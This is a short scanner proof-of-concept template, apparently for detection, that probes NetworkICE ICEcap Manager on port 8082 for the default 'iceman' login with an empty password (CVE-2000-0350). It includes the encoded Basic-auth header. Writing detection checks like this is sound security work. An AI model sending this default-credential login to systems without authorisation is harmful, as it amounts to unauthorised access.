[info]
author = "ave"
description = "验证 NetworkICE ICEcap Manager 是否存在默认用户名 iceman 空密码漏洞。向目标 8082 端口发送 HTTP GET 请求，使用默认凭据 iceman 空密码进行认证，若返回 200 则确认存在默认凭据漏洞。"
id = "POC-AVE-2000-0304"
name = "NetworkICE ICEcap Manager 默认凭据 PoC"
severity = "medium"
tags = ["ave-2000-0304"]
vuln_id = [
    "CVE-2000-0350",
    "AVE-2000-0304",
]

[poc]
logic = "any"

[[poc.requests]]
method = "GET"
path = "/{{BaseURL}}/"
protocol = "http"

[poc.requests.headers]
Authorization = "Basic aWNlbWFuOg=="
Host = "{{Hostname}}:8082"

[[poc.requests.matchers]]
expect = true
status = [200]
type = "status"
